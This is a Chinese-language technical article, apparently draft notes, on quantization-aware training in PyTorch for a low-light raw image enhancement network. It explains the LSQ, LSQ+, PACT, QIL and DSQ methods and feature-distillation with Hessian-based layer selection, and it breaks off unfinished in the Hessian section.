<p>神经网络使用8位整数进行计算，但是在一般平台中，用于计算的寄存器并不是8位的，因为需要考虑8位运算的溢出问题，所以寄存器位数会稍微大一些，所以一些平台也可以使用高于8位的计算，为了支持这种功能，这里量化中首先支持了量化位数的选择。其次，量化中需要考虑一些层量化的配置，例如一些层的权重需要使用逐通道量化，一些层需要使用对称量化，同时需要支持不同的量化方法选择，所以在量化参数选择上，量化框架给出了配置默认量化位数、量化算法、对称量化以及逐通道量化的字段，同时还支持特殊层量化参数的配置，只需要给出相应的量化层即可。</p>
<h2
id="torch.nn.qat与torch.nn.intrinsic.qat实现量化神经网络">torch.nn.qat与torch.nn.intrinsic.qat实现量化神经网络</h2>
<p>由于网络中有好多类算子，如卷积、全连接，这些类算子还有许多类型，如2d卷积，3d卷积，反卷积等等，如果想实现一个量化算法，那么需要将所有操作都实现成量化算子，同时现在量化方法有很多，那么这就会导致实现一个量化框架的工作量会成倍的增长，幸好pytorch提供了torch.nn.qat与torch.nn.intrinsic.qat算子库，在量化的过程中只需要将量化方案写好相应的类，然后其可以自动将权重进行量化，</p>
<h3
id="torch.nn.qat与torch.nn.intrinsic.qat的使用">torch.nn.qat与torch.nn.intrinsic.qat的使用</h3>
<p>在torch1.8版本中，torch.nn.qat中主要实现了相关的量化模块，torch.nn.intrinsic中实现了这Conv和Linear与其他算子融合的操作，并且再torch.nn.intrinsic.qat提供了融合之后的量化模块，这些算子都在32位浮点数精度下运行，使用了舍入方式来模拟量化效果，可以很好的进行量化感知训练，两个模块已经足够应付大部分典型的CNN与RNN网络了。下面给出两个模块中主要实现的算子：</p>
<p>torch.nn.qat - Linear : 全连接量化感知训练算子 - Conv :
卷积量化感知训练算子</p>
<p>torch.nn.intrinsic.qat</p>
<ul>
<li>ConvBn2d : Conv2d + BatchNormal融合的量化感知训练算子</li>
<li>ConvBnReLu2d : Conv2d + BatchNormal +
ReLU融合的量化感知训练算子</li>
<li>ConvReLU2d : Conv2d + ReLU融合的量化感知训练算子</li>
<li>LinearReLU : Linear + ReLu融合的量化感知训练算子</li>
</ul>
<p>上述算子的使用和正常未量化神经网络中的代码一样，不同的是，相比于原始算子，量化算子需要设置qconfig变量来配置权重参数的量化方案。</p>
<p>这里的模块实际上是需要配合torch.fx中的工具进行使用的，因为需要将原始网络中的未量化的算子替换为量化算子，即可完成量化模型的生成。</p>
<h2 id="量化算法的组成">量化算法的组成</h2>
<p>量化感知训练由两部分组成，首先是两户参数的统计，主要是对activation进行统计，在统计结束之后才进行相应的量化，所以在开发量化算法时也有两部分组成，一部分是参数量化，另一部分是参数统计，在代码中都放在相关层的qconfig变量中，在上一节所说的量化中，torch.nn.qat与torch.nn.intrinsic.qat只表示了对weight进行量化的操作，但是没有对activation量化的操作，所以，在生成量化网络中需要我们手动在量化节点之前加上activation量化操作，这样才能完成整个量化算子。
<img src="qconfig.png" alt="qconfig" /></p>
<p>在框架的组织上，需要将统统计算法和量化算法分开进行开发，将两部分解耦合可以很好的进行量化算法和参数统计算法组合，同时在量化算法中还要加入一个开关，用于切换参数统计和量化两种计算模式的切换。</p>
<h2 id="量化框架通用性展示">量化框架通用性展示</h2>
<p>既然是一个量化框架，必然可以适用于多种网络，这里我们以经典的网络为例，来展示框架的易用性，这里测试一下经典结构unet结构的网络，这里采用一个使用unet结构的语义分割网络进行测试。</p>
<p>unet是一种常用在计算机视觉中的网络结构，最早用于解决医学中的细胞分割的问题，所以常见的一些语义分割会使用unet，当然本文网络中实际上也使用了unet，unet在2015年的ISBI
cell
tracking比赛中获得了很多方面的第一名。unet网络结构主要是卷积和池化层相互交叉，使用了一种类似于Encoder-Decoder的结构，如下图所示
<img src="unet-encoder-decoder.png" alt="unet-encoder-decoder" /></p>
<p>可以看到网络结构主要由卷积和池化等操作组成，左侧为下采样网络，右侧为上采样网络，图中中间的四个水平线表示的是，主要用来融合上采样和下采样之间的特征。融合操作就是将特征图的通道进行叠加。
根据前面的介绍，模型量化过程中需要将节点进行替换操作，这里可视化这种替换操作情况可以使用Netron查看网络模型情况的工具，将网络转换为onnx模型，可以很清楚的看出模型使用了什么层，对那部分进行了转换，如果无法转换说明量化时没有办法进行正常计算。</p>
<h3 id="量化模型结果">量化模型结果</h3>
<p>首先查看框架对于量化节点的处理，然后再查看对于蒸馏处理的情况，同时查看量化框架的灵活，对于激活值和权重量化方法以及相应位数的修改是否支持。
1. 量化情况 <img src="no_quant_method.png" alt="no_quant_method" /> <img
src="quant_method.png" alt="quant_method" /></p>
<p>可以看到量化网络和未量化网络之间差距，量化网络中使用了量化节点来替换原来未量化的节点！</p>
<ol start="2" type="1">
<li>蒸馏情况</li>
</ol>
<p><img src="quant_distill.png" alt="quant_distill" /> <img
src="no_quant_distill.png" alt="no_quant_distill" /></p>
<p>当前网络位置是在最后一个位置，这里量化网络中的1053表示的是最终网络输出的结果，与为量化结果中的307号节点一致，量化网络的1048节点与量化网络的1053节点一样，同样是表示输出节点，但是这是蒸馏框架后加入的。可以看出量化功能是正常的。</p>
<ol start="3" type="1">
<li>量化参数相关</li>
</ol>
<p>可以看到设置的量化方法有两个，对任一层设置任意量化函数这个功能是成功的，同时可以看到其中含有参数0和1023，这个是表示量化后可取整数值为<span
class="math inline">\([0,1023]\)</span>，可以看到这个层设置的量化是逐张量量化并且量化位数为10位。
<img src="quant_method_config.png" alt="quant_method_config" /></p>
<h1 id="本文主要使用的方法">本文主要使用的方法</h1>
<h2 id="暗光增强方法">暗光增强方法</h2>
<p>选用贴合实际的一个工作，使用raw图片来进行处理。</p>
<h3 id="暗光网络结构">暗光网络结构</h3>
<p>本工作的量化是在Abandoning the Bayer-Filter to See in the
Dark工作基础上来完成的，这里介绍一下这个工作的一些细节。</p>
<h3 id="暗光增强处理思路">暗光增强处理思路</h3>
<p>在数字图像中，室内和夜间等照明不佳的环境，以及曝光参数不合适的条件下，由于颜色失真和噪声等原因图像质量会下降。加长曝光时间通常会导致运动模糊等问题，同时采用相机补光会产生颜色失真等问题，近些年来深度学习方法已经用于解决暗光增强问题。然而一些深度学习算法可能受到一些硬件的限制，因为不同的硬件其接收光子的能力是不同的，比如RYYB色彩滤波阵列比RGGB色彩滤波阵列多接收40%的光子，因此运行在拥有RYYB色彩滤波阵列的算法会有更好的性能。
为了解决这个问题，可以再捕获光子时将色彩滤波阵列去除，这样通过牺牲颜色信息来获取更多的光子数量，与带有色彩滤波器的设备相比会获得更好的成像效果。实际上一些智能手机现在就是使用这样的方法去完成摄像质量的提升，双摄像的智能机会配备一个单色传感器摄像头和一个彩色传感器摄像头，其中的单色传感器摄像头没有色彩滤波阵列，其他方面与彩色传感器摄像头一致，从而能接受更多光子，这种双摄像头的配置可以再暗光环境下获得更好的拍照效果。但是相机数量也是一种成本，一些设备实际上并没有多个摄像头。
借用上述的想法，可以使用两个模块来模拟上述处理方案：De-Bayer-Filter(DBF)模块使用彩色传感器的摄像头来计算出单摄像头的输出，结果作为单色图像的预测，从而代替单色相机，Dual
Branch Low-light
Enhancement(DBLE)模块将彩色输入和模拟出来的单色输出通过一个双分支处理模块，融合生成最终的RGB暗光增强图。弥补了有色raw图与单色raw图的不足，同时，融合的过程中使用了通道注意力机制，用来建立两种数据之间的交互，从而获得更好的回复能力。</p>
<h3 id="网络结构介绍">网络结构介绍</h3>
<p>本文的网络使用相机的raw数据进行处理，传统isp的处理方式raw数据的方式主要是通过几个算法：白平衡、demosaic、降噪、锐化、颜色空间转换、Gamma矫正。
<img src="isp_calculate_raw.png" alt="isp_calculate_raw" /></p>
<p>但是在本文中主要使用深度学习方法来处理暗光raw图像，防止isp在处理过程中将图像原始信息删除掉，使之能取得更好的性能，</p>
<h4 id="de-bayer-filter模块">De-Bayer-Filter模块</h4>
<p>数百万的微小传感器用于接受光子并将其转化为电信号，单独的传感器只能产生会的图像，bayer滤色镜覆盖在传感器之上收集颜色信息来产生彩色图像，一个标准的bayer单元主要的组成为<span
class="math inline">\(2 \times
2\)</span>的带有两个绿色一个红色和蓝色的滤色镜，一个确定滤色镜只会让相应波长的光子通过，现在的神经网络可以对相机成像过程进行很好的模拟<a
href="Learning%20to%20see%20in%20the%20dark.%7CNeural%20camera%20simulators%7CDeepisp:Toward%20learning%20an%20end-to-end%20image%20processing%20pipeline"></a>。在这里使用了一个De-Bayer-Filter(DBF)模块，用于滤色镜对光线处理中光子量变化的建模，以得到去除bayer滤色镜之后的结果。DBF模块将输入的原始彩色raw图像<span
class="math inline">\(A_{color} \in R^{\frac{H}{2} \times \frac{W}{2}
\times 4}\)</span>恢复为单色图像<span class="math inline">\(A_{mono} \in
R^{H \times W}，模块可以公式化为：\)</span>$ A_{Mono} = f_{M}(A_{Color})
$$ 其中f_{M}()是一个基于unet的卷积网络结构，使用L1损失函数去来对<span
class="math inline">\(f_{M}\)</span>网络进行训练，这里认为f_{M}产生的单色图像会给后续暗光增强任务提供更多信息。</p>
<figure>
<img src="model_struct.png" alt="model_struct" />
<figcaption aria-hidden="true">model_struct</figcaption>
</figure>
<h4 id="双分支暗光图像增强模块">双分支暗光图像增强模块</h4>
<p>raw彩色图像和单色图像有很多不同点 1. raw彩色图像有bayer结构 2.
raw彩色图像由四个通道组成，每个通道的分辨率为<span
class="math inline">\(\frac{H}{2} \times
\frac{W}{2}\)</span>，所对应的图像是一个分辨率为<span
class="math inline">\(H \times W\)</span>的图像。 3.
单色图像中不包括颜色信息。 4.
单色相机传感器可以更好的捕捉光线，单色图像更好的保留了图像照明信息</p>
<p>双分支暗光增强模块DBLE（dual branch low-light image
enhancement）基于以上特征进行设计，其用来处理raw彩色图像以及DBF产生的单色图像，DBLE首先对两个输入进行下采样，然后在级联的基础上对下采样的特增进行融合，同时在上采样分支上加入通道注意力层（CA），来合成符合人眼视觉的RGB图像<span
class="math inline">\(I_{rgb} \in R^{H \timesW \times
3}\)</span>，模块可以公式化为： <span class="math display">\[I_{RGB} =
f_{C}(A_{Color};A_{Mono})\]</span> 其中<span
class="math inline">\(f_{C}\)</span>表示全卷积神经网络，ground
truth与预测图像使用L1范数来计算损失，以此来训练DBLE从中学习到将低光照图像恢复人眼可接受的正常光照的RGB图片。</p>
<p>传统的unet网络，对待每一个特征是平等的，所以不能直接融合单色图特征和彩色图特征，否则会导致一些特征的矛盾。同时转置卷积以及卷积步长的设置也会将空间信息进行忽略，于是在级联之后会使用通道注意力机制来对结果进行校准，以弥补彩色图像和单色图像之间的差距，通道注意力机制可以很好的对彩色图像和单色图像的相互作用进行建模，使得二者互补来减少两个领域的矛盾。当然通道注意力机制的作用不止这些，unet还有可能会导致棋盘状失真，通过通道注意力机制可以很好的限制这样，因为通道注意力机制中也包含放大缩小等操作，因此通道注意力机制类似于通过权重重新绑定的方式来抑制此类事件的发生。</p>
<h3 id="数据集介绍">数据集介绍</h3>
<p>本工作使用了SID（See-in-the-Dark）数据集，SID数据集由Learning to See
in the
Dark这篇论文提供，其主要目的是为了服务于使用raw图像暗光重建任务而产生的，同时也为一些降噪算法进行服务。</p>
<p>SID数据集包括5094张raw短曝光图像，每一张短曝光图像都有一张与之对应的长曝光图像，但是一张长曝光图像与多个不同曝光时间的短曝光图像对应，因为短曝光图像可能会有一些噪声，所以这个数据集也被用来测试降噪算法，同一场景下每一张短曝光图像都是不同的，因为他们有不同的伪影。不同的长曝光图片的数量有424张。
数据集包含了室内和室外的场景，室外场景是在夜间伴这月光或者路灯拍摄所得，在室外场景下光照强度通常在0.2lux到5lux之间。室内场景光照强度接近于黑暗，通常在封闭环境、没有灯光的条件下下进行拍摄，室内场景下光照强度通常在0.03lux到0.3lux之间。</p>
<p>数据集中短曝光图片的曝光时间设置在了0.03 ~ 0.1秒之间，相应的ground
truth，也就是长曝光时间在10到30秒，是短曝光时间的100到300倍，所以相比于暗光图像，长曝光图像曝光的时间是足够长的。数据集中的所有场景都是静态的，不然会有一定程度的动态模糊，具体情况见下表，具体数据情况见下图
<img src="dateset_detail.png" alt="dateset_detail" /> <img
src="long_expose.jpg" alt="long_expose" /> <img src="short_expose.jpg"
alt="short_expose" /></p>
<p>图像的拍摄主要是使用了<span class="math inline">\(Sony
\alpha7S\)</span>和<span class="math inline">\(Fujifilm
X-T2\)</span>相机，两个相机有着不同的传感器，Sony相机使用了全画幅的Bayer传感器，Fuji相机使用了APS-C
X-Trans传感器，相机固定在三脚架上，并使用无反光镜相机来避免反光镜抖动产生的振动，在不同场景中都要调节相机的一些参数，以此来获得最佳的长曝光图像效果。短曝光图像使用智能手机使用长曝光时间减少100到300倍之后的时间长度进行拍摄。将拍摄后能完美对齐的图像进行使用。
虽然长曝光图像含有一些噪声，但是其足以作为ground
truth进行训练，因为网络主要目的是为了暗光增强效果。</p>
<h2 id="量化方案">量化方案</h2>
<h3
id="如何解决图片颜色分层的问题以及亮点出现黑洞的问题">如何解决图片颜色分层的问题，以及亮点出现黑洞的问题</h3>
<p>主要是由于在网络中8位整数量化</p>
<h4 id="中间增加位数">中间增加位数</h4>
<h4 id="两端增加位数">两端增加位数</h4>
<h3
id="量化方法中使用dsq-与-lsq方法进行神经网络训练更好的将网络调参进行下去">量化方法中使用dsq
与 lsq+方法进行神经网络训练。更好的将网络调参进行下去</h3>
<p>由于一些时候，一些非深度学习的量化参数调节方法未必回答道很好的效果，所以这里使用神经网络自主调整量化参数的方法lsq+，首先使用确定的算法统计出一个参数，然后这个参数在经过神经网络进行调节，同时为了能使得lsq+更加准确，对反向传播过程这里不再使用传统的STE去模拟反向传播过程，而是用更符合数学推理的dsq方式近进行推理。为了能更好的理解本文的方法，首先对lsq+的简单版本lsq方法以及lsq+方法和dsq进行介绍。</p>
<h4 id="lsq方法">lsq+方法</h4>
<p>为了能更好的理解lsq+方法，这里使用lsq来对lsq+方法的数学推理先进性铺垫。
深度神经网络在推导过程中使用低精度整数操作计算卷积和全连接层，对于卷积和全连接层需要量化其中的权重和激活值，当给出需要量化的参数为x，量化中scale为s，量化后整数边界设为<span
class="math inline">\(Q_{P}\)</span>和<span
class="math inline">\(Q_{N}\)</span>，可以定义一个量化公式，使之得到最终量化之后的结果<span
class="math inline">\(X\)</span> <span class="math display">\[
X = \lfloor clip(\frac{x}{s},-Q_{N},Q_{P}) \rceil \\
\]</span> 其中clip(a,l,r)表示当a &lt; l时函数取值为l，a &gt;
r时函数取值为r，否则取值为a。<span class="math inline">\(\lfloor a
\rceil\)</span>表示输出距离a最近的整数，使用这样的一个方案视为和后续求导的一些问题，这个在后文介绍。假设量化位数为b，量化使用对称量化，那么<span
class="math inline">\(Q_{N} = 2^{b - 1}\)</span>，<span
class="math inline">\(Q_{P} = 2^{b - 1} - 1\)</span>。</p>
<p>有了量化方案，那么剩下的就是怎样确定量化方案中参数，现已知量化方案中未知的参数为s，所以要通过一些方法确定s，LSQ给出的方法是通过网络计算loss值后进行反向转播学习s，但是由于损失函数在对s求导时并不可导，所以需要手动给出s的导数求解函数，主要参考STE方法进行相应的推导。现给出推导过程！！</p>
<p>首先分析STE的导数求解方案，对于取整函数没有导数的问题，STE将取整函数的导数进行修改了，这在pytorch上很容易实现，只需要给出一个函数为取整函数，其backward函数为函数的导数计算函数，这样就能按照预想的方案来求解梯度，STE将取整函数的梯度设置为如下表达式：
<span class="math display">\[
\frac{\partial \lfloor x \rfloor}{\partial x} = 1
\]</span>
表达式十分简单。将上述方案应用在LSQ的量化表达式上会有一些问题，在训练过程中，通过量化和反量化将量化损失引入网路中，假设X'为反量化之后的结果,X为量化之后的结果，s为量化时区间映射的系数，则<span
class="math inline">\(X&#39; =
Xs\)</span>，于是X'关于s的导入有如下推导： <span class="math display">\[
\begin{matrix}
\frac{\partial X&#39;}{\partial s} &amp;= \frac{\partial Xs}{\partial
s}\\
                               &amp;= s\frac{\partial X}{\partial s} + X
\end{matrix}
\]</span></p>
<p>其中X关于s的导数如下： <span class="math display">\[
\frac{\partial X}{\partial s} = \frac{\lfloor
clip(\frac{x}{s},-Q_{N},Q_{P}) \rceil}{\partial s}
\]</span>
由于clip函数的存在，所以上式是一个分段函数，所以在这里分段讨论，当<span
class="math inline">\(-Q_{N} &lt;= \frac{x}{s} &lt;=
Q_{P}\)</span>时<span
class="math inline">\(clip(\frac{x}{s},-Q_{N},Q_{P}) =
\frac{x}{s}\)</span>，即求导函数为 <span class="math display">\[
\frac{\partial X}{\partial s} = \frac{\lfloor
clip(\frac{x}{s},-Q_{N},Q_{P}) \rceil}{\partial s} = \frac{\lfloor
\frac{x}{s}\rceil}{\partial s}
\]</span> 类比STE函数，<span
class="math inline">\(\frac{\partial{\lfloor \frac{x}{s}
\rceil}}{\partial\frac{x}{s}} = \frac{\partial{\lfloor \frac{x}{s}
\rceil}}{-\frac{x}{s^{2}}\partial s} = 1\)</span></p>
<p>所以 <span class="math display">\[
\frac{\partial X}{\partial s} =
\frac{\partial\lfloor\frac{x}{s}\rceil}{\partial s} = -\frac{x}{s^2}
\]</span></p>
<p>当<span class="math inline">\(\frac{x}{s}\)</span>不在<span
class="math inline">\([-Q_{N},Q_{P}]\)</span>中，X为与S无关的常数，导数为0，所以X’关于s的导数为：</p>
<p><span class="math display">\[
\frac{\partial X&#39;}{\partial s} = \left\{\begin{matrix}
\lfloor \frac{x}{s}\rceil - \frac{x}{s}\\
-Q_{N}\\
Q_{P}
\end{matrix}\right.
\]</span>
以上就是LSQ在训练中使用的梯度函数的推导过程以及结论。观察导数函数，可以看到<span
class="math inline">\(\frac{x}{s} - \lfloor \frac{x}{s}
\rceil\)</span>表示的是取整之后和美取整之后的差距，使用<span
class="math inline">\(\lfloor\rceil\)</span>可以使得梯度函数绝对值最值比较小，如果使用<span
class="math inline">\(\lfloor\rfloor\)</span>会使得梯度函数绝对值最值更大，可以观察如下函数图像，如图：
<img src="grad_graph.png" alt="grad_graph" />
在LSQ方法中s参数在初始化时每个激活值以及权重都有不同的初始值，一般固定为<span
class="math inline">\(s = \frac{2&lt;|x|&gt;}{\sqrt{Q_{P}}}\)</span>
事实上还有一些其他的通过神经网络量化思路来解决该问题的方法，如QIL，PACT等，本工作选择了LSQ原因主要还是在于导数表达式上。为了能更好的说明LSQ的效果，这里简单的介绍一些QIL，PACT方案的工作原理</p>
<p>PACT的思路主要针对activation而言，在量化的过程中权重和激活值不一样，权重的量化损失可以通过反向传播进行训练来补偿，但是激活值的量化损失只能再次通过权重进行补偿。ReLU函数有很多变体，比较原始的ReLU是没有上界的，如果网络中使用这样的激活函数，那么最终获得的激活值也是没有上界的，如果激活函数的输出能在一定范围内，这样得到的激活值的量化误差会相应小一些，截断式ReLU就是这样的函数，但截断ReLU虽然能缓解量化误差，但是却不能考虑到真正的激活值分布情况，简单的使用也会造成一些问题。PACT方法是一种带有学习参数的截断式ReLU函数，其方程为</p>
<p><span class="math display">\[
y = PACT(X) = 0.5(|X| - |X - \alpha| + \alpha) = \left\{\begin{matrix}
0, x\in(-\infty, 0)\\
x, x\in[0,\alpha)\\
\alpha, x\in[\alpha,+\infty)\end{matrix}\right.
\]</span></p>
<p>如果<span
class="math inline">\(\alpha\)</span>是一个固定参数，那么其输出为与截断式ReLU一致，但是PACT为了使其能更好的缓解激活值量化误差补偿问题，将<span
class="math inline">\(\alpha\)</span>设计为一个网络中的可学习参数。于是激活值的量化函数可以写为：
<span class="math display">\[
X = \lfloor x\frac{2^{k} - 1}{\alpha}\rceil
\]</span> 相应的反量化函数为 <span class="math display">\[
X&#39; = X \frac{\alpha}{2^{k} - 1}
\]</span> 这里的量化的step为<span
class="math inline">\(\frac{\alpha}{2^{k} -
1}\)</span>，与LSQ类似也是一个可学习参数。</p>
<p>这里对反量化参数关于可训练参数进行求导，可以得到如下的结果 <span
class="math display">\[
\frac{\partial X&#39;}{\partial \alpha} = \left\{\begin{matrix}0,
x\in(-\infty,\alpha)\\1,x\in[\alpha,+\infty) \end{matrix}\right.
\]</span> 这里的梯度计算也是用STE技巧</p>
<p>QIL的思路与PACT类似，因为PACT修改使用截断式ReLU来规范激活值的范围，但是规范的范围是[0,]，很明显下界是不可调节的，这就导致了PACT算法有一些局限性，为了，弥补这样的问题，QIL使用下界可调节的方案，进一步将量化范围进行细化。梯度与PACT方法类似
如果对几种量化方法使用3位量化的方案，可以发现量化使用的取整函数，假设当前量化位数为3，观察图像
<img
src="https://pic4.zhimg.com/80/v2-ba2753f4c017927ddc9428597a38b3e7_720w.webp"
alt="quant_fun" /> 这个取整函数不是一个连续函数，可以发现其中在n +
0.5的位置函数发生了跳变，其中<span class="math inline">\(n\in
Z\)</span>，一种合理的梯度函数就是在n +
0.5的位置发生跳变，观察LSQ的求导函数可以发现其在0.5位置梯度发生了跳变，但是其他方法的导数只有有限的几个跳变位置，所以不符合数学逻辑。</p>
<p>LSQ在使用过程中只对量化中scale参数进行训练，但是其固定了量化时的零点，在LSQ+中改变了这样一个问题，将量化中的零点也作为量化参数进行训练，这就是LSQ与LSQ+之间的区别。</p>
<p>由上面的推导过程可知，对于取整函数使用了STE方案来近似导数，实际上这是不符合数学逻辑的，所以这里我们修改上述过程，将导数处处为0的取整函数改为使用可导函数模拟的方案来更加准确的将量化相关参数训练出来。</p>
<h4 id="dsq方法">dsq方法</h4>
<p>对于多位均匀量化方法中，量化函数的导数处处为0，使得网络在训练过程中无法找到真正的调整方向，使得量化之后的参数很难进行调节，为了缩小全精度模型与量化模型之间的差距，可以采用一种函数去模拟取整函数，在dsq中就使用了<span
class="math inline">\(tanh\)</span>函数进行模拟，对于多位量化中，由于取整函数有多个分段，但是tanh函数只有一个分段，所以需要使用多个tanh进行量化，对于量化过程中x所在的不同区间<span
class="math inline">\(P_{i}\)</span>其量化表达式为： <span
class="math display">\[
\varphi(x) = s\ tanh(k(x - m_{i})), if x\in P_{i}
\]</span> 其中 <span class="math display">\[
m_{i} = l + (i + 0.5)\Delta \\ s = \frac{1}{tanh(0.5k\Delta)}
\]</span>
其中的放缩参数s保证了tanh函数在不同区间能进行平滑的连接，由于tanh函数具有一定的对称性，所以<span
class="math inline">\(\varphi\)</span>函数在任意一个位置都可导，此外表达式中的系数k可以决定函数的形状是否接近量化函数，k值越大，渐进函数就越接进去取整函数的形式，整体呈现为阶梯函数。但是这种阶梯型形式是有一定范围的，加上一个范围之后，可以得到一个量化函数<span
class="math inline">\(Q_{s}\)</span> <span class="math display">\[
Q_{s} = \left\{\begin{matrix}l, &amp;x &lt; l,\\u, &amp;x &gt; u,\\l +
\Delta(i + \frac{\varphi(x) + 1}{2}),&amp;x\in P_{i}\end{matrix}\right.
\]</span></p>
<p>将这个函数图绘制之后可以发现 <img src="dsq_line.png"
alt="dsq_line" /></p>
<p>当<span
class="math inline">\(\varphi\)</span>中k值越大的时候，函数越像阶梯函数，所以在实际量化中，可以使用这个函数来模拟真实量化对于网络推理中结果的影响，同时在之前也提到，这个函数也能很好的进行反向传播的梯度计算，这个量化函数将函数进行整形，通过重新反向传播进行来准确的修正量化误差。</p>
<p>当<span
class="math inline">\(\varphi\)</span>的符合函数中出现了符号函数是，DSQ可作为均匀量化方法中的取整函数，当量化分段点只有一个时，这个时候的DSQ量化方法可以视为二值化量化方法。
<img src="dsq_split.png" alt="dsq_split" /></p>
<p>了解了DSQ函数之后，相应的对于神经网络标准量化可微函数可以使用dsq函数，但是dsq函数与量化取整函数的相似程度会影响量化结果，在训练的过程中需要对dsq中的参数进行合理的确定，才能达到训练的最佳效果。</p>
<p>为了能使得DSQ方法能达到最佳效果，原文中对DSQ中相关参数进行了实验，主要改变<span
class="math inline">\(\varphi\)</span>中的参数k，这里引入变量<span
class="math inline">\(\alpha\)</span>， <span class="math display">\[
\alpha = 1 - tanh(0.5k\Delta) = 1 - \frac{1}{s}
\]</span> 其中<span class="math inline">\(\Delta = \frac{u - l}{2^{b} -
1}\)</span>，可以理解这个<span
class="math inline">\(\alpha\)</span>实际上表示了在区间[-1,1]之间<span
class="math inline">\(\varphi\)</span>函数离1的最小距离。如下图所示：
<img src="alpha_means.png" alt="alpha_means" /></p>
<p>现在对上述表达式进行改写，使得相关参数使用<span
class="math inline">\(\alpha\)</span>与<span
class="math inline">\(\Delta\)</span>来进行表示，于是可以得到： <span
class="math display">\[
s = \frac{1}{1 - \alpha}
\]</span> 同时由于<span class="math inline">\(\varphi(0.5\varphi) =
1\)</span>，所以 <span class="math display">\[
k = \frac{1}{\Delta}log(\frac{2}{\alpha} - 1)
\]</span> 基于以上公式，文中对<span
class="math inline">\(\alpha\)</span>进行了改变，得到了量化最优解，量化过程中使用均匀量化，带符号函数的DSQ可以在均匀量化可以取得很稳定的量化结果，<span
class="math inline">\(\alpha\)</span>很小时，DSQ可以很等同于未使用DSQ的均匀量化。当然文中的任务是目标检测，所以可以得到的一个结论就是合适的<span
class="math inline">\(\alpha\)</span>可以使得量化效果更好，有助于提高模型精度。
根据以上结论，DSQ的逼近能力主要取决于<span
class="math inline">\(\alpha\)</span>，其在优化DSQ量化网络效果中起到了重要的作用，然而认为手动去调节这个参数显然有点不合适，也比较费力，为了能自适应的确定它，这里引入一种训练方式，该方式将量化网络中的<span
class="math inline">\(\alpha\)</span>视为更加重要的参数，并在训练的过程中对<span
class="math inline">\(\alpha\)</span>进行自适应调节，使其作为网络中的参数，于是量化网络的损失函数的目标可以使用如下表达式表示
<span class="math display">\[
min_{\alpha}L(\alpha;x,y)
\]</span> 其中x表示输入网络的数据，y表示ground
truth。根据这个表达式，可以通过求解L关于<span
class="math inline">\(\alpah\)</span>的导数，然后进行反向传播进行调节<span
class="math inline">\(\alpha\)</span>。</p>
<h4 id="dsq和lsq的结合">DSQ和LSQ的结合</h4>
<p>了解两种方案之后，这里给出将两种方法结合的一个方案，考虑到LSQ+虽然对量化相关参数加入到网络中称为网络训练参数来进行调节，但是调节所使用的数学方法实际上是不符合数学公式的，所以就算使用LSQ调节也未必能发挥这个思想的全部能力，DSQ却能很好的解决训练过程中出现的量化函数导数为0的问题。</p>
<p>算法的主要流程是这样的，首先将网络使用我们开发的框架进行量化，虽然LSQ能对量化参数进行神经网络训练，但是在量化之前仍然要进行量化相关参数的设置，使得网络尽可能接近最优解，主要是通过参数统计进行，通过量化网络对输入数据集的计算统计激活值的分布，通过激活值分布来确定对激活值量化的初始参数为多少，通过。对于底层量化取整函数采用dsq的方案，将多段反正切函数拟合取整函数，一次达到正确的梯度反向传播。</p>
<h2 id="量化蒸馏方案">量化蒸馏方案</h2>
<p>量化过程中量化网络产生了精度的偏差会使得网络很难达到预期效果，量化模型又可以视为一个压缩的模型，所以量化任务可以视为将一个压缩之后的模型训练接近原始未量化模型的任务。在以往的工作中，蒸馏是将原模型精简之后的模型，通过未精简的教师模型的一些辅助结果进行训练，在量化中也可以采用这样的思路，将量化后的模型视为学生网络，同时使用一个未精简的并且训练到收敛的教师网络进行辅助训练。</p>
<p>有了这样的思路之后仍然有一些问题需要解决</p>
<ol type="1">
<li>如何进行学生和教师网络的知识传递</li>
<li>教师网络蒸馏特征应该怎样选择</li>
<li>如何指定损失函数 在后文会对这些问题进行解决</li>
</ol>
<h3
id="学生网路和教师网路之间的知识传递">学生网路和教师网路之间的知识传递</h3>
<p>知识蒸馏传统的方法中对于知识的传递主要有，基于相应的知识蒸馏、基于特征的知识蒸馏、基于关系的知识蒸馏，由于本文网络训练中存在数据集，所以不需要基于相应的知识蒸馏，同时教师网络并不是很大，同时基于关系的知识蒸馏又较为复杂不实用。本文主要是做图像增强任务的，需要一些层学习到相应的特征，所以这里使用了基于特征图的知识蒸馏。知识蒸馏的一个关键点在于如何设定损失函数，使得其能够学到所要的特征，对一些概率特征的学习可以使用交叉生损失函数，对于特征图的学习可以使用MSE损失函数来，经过当学生模型的特征图接近教师模型的特征图是，MSE损失函数会接近于0。</p>
<h3 id="如何设定损失函数">如何设定损失函数</h3>
<p>由于不同特征对于结果的的好坏有不同的影响，所以不同特征的重要性也是不一样的，所有特征损失函数融到最终的损失函数之后的表达式结果如下：
<span class="math display">\[
L = \sum_{i = 1}^{n} \lambda_{i}L_MSE{t_i,s_i}
\]</span> 其中n表示学生网络向教师网络学习特征的数量，<span
class="math inline">\(t_i\)</span>表示的是教师网络中第i个特征，<span
class="math inline">\(s_i\)</span>表示的是学生网络中第i个特征，而<span
class="math inline">\(\lambda_i\)</span>表示的是特征的重要性，再传统基于特征的知识蒸馏中教师网络的不同位置的特征情况是不一样的，教师网络的顶层具有多的参数和更强的表达能力，可以捕捉高级特征，教师网络中间层可以获得更为具体的局部特征，但是这些选择方案缺少一些数学推到依据，同时无法确定哪些层具有较高的重要性，那些曾具有较低的重要性，所以在本文使用了hessian统计参数的评估方法，蒸馏层的确定以及蒸馏层的重要程度都需要根据hessian矩阵相关统计值来进行确定。</p>
<h3 id="如何选取蒸馏层">如何选取蒸馏层</h3>
<p>如果一个层发生一定的变动会对结果产生很大的影响，那么我们认为这一层的参数是一个非常重要的参数，通过遍历每一层的输出值然后改变输出参数大小观察对结果的影响，以此为依据来确定蒸馏层的选择确实是一个方案，但是这样的方法有几个问题：1.
如何衡量对不同矩阵的修改程度，2. 怎样快速的完成遍历。首先第一个问题
如何衡量矩阵的修改程度，假设矩阵变动之后与原矩阵的变动之差为<span
class="math inline">\(\Delta
W\)</span>，比较两个矩阵可以使用数学中的范数，我们使用<span
class="math inline">\(|\Delta W|^2_2\)</span>即<span
class="math inline">\(\Delta
W\)</span>的二范数来表示矩阵的变化程度。第二个问题需要我们通过固定这个二范数之后，找出一种数学方法来衡量其对最终输出结果的影响。本文主要使用的是hessian矩阵的迹来进行衡量，通过计算activation的hessian的迹来判断特征的重要程度。</p>
<h3 id="hessian矩阵介绍未完">hessian矩阵介绍(未完)</h3>
<p>hessian矩阵式是一个与函数二阶导数有关的矩阵，一个函数存在多个变量时，对所有参数进行二阶偏导数然后将其组成方阵，得到的矩阵就是hessian矩阵，假设函数形式为<span
